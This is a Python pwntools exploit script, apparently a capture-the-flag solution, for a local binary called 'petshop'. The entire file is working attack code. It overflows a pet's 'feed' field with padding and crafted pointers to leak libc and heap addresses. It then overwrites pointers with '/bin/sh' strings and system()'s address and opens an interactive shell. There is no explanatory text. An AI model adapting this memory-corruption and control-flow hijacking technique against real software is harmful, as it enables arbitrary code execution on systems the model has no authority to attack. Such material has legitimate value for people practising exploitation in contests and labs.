#!/usr/bin/python
from pwn import *

p = process('./petshop')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def buy(idx):
  p.recvuntil('select:')
  p.sendline('1')
  p.recvuntil('select:')
  p.sendline(str(idx))

def sell():
  p.recvuntil('select:')
  p.sendline('2')

def sound(idx):
  p.recvuntil('select:')
  p.sendline('3')
  p.recvuntil('sound:')
  p.sendline(str(idx))

def set(idx, name, sound, feed):
  p.recvuntil('select:')
  p.sendline('4')
  p.recvuntil('set:')
  p.sendline(str(idx))
  p.recvuntil('name:')
  p.sendline(name)
  p.recvuntil('sound:')
  p.sendline(sound)
  p.recvuntil('feed:')
  p.sendline(feed)

def list():
  p.recvuntil('select:')
  p.sendline('5')

def set_name(name):
  p.recvuntil('select:')
  p.sendline('6')
  p.recvuntil('name?')
  p.sendline(name)

buy(1)
buy(2)
set(1, 'A', 'B', 'C'*12 + p64(0x604040) + p64(8))
list()

base = u64(p.recvuntil('2 pet')[-14:-6]) - libc.symbols['__libc_start_main']
system = base + libc.symbols['system']
magic = base + 0xef6c4 
print hex(base)
print hex(magic)

set(1, 'A', 'B', 'C'*12 + p64(base + 0x3c31b0) + p64(8))
list()
heap = u64(p.recvuntil('2 pet')[-14:-6])
print hex(heap)

set(1, 'A', 'B', 'C'*12 + p64(0x604088) + p64(0x10) + p64(heap+0x11c10) + '/bin/sh\x00'*7 + p64(heap + 0x11c10 + 0xd0) + '/bin/sh\x00'*8)
set_name(p64(system)[:-1])
p.interactive()
  

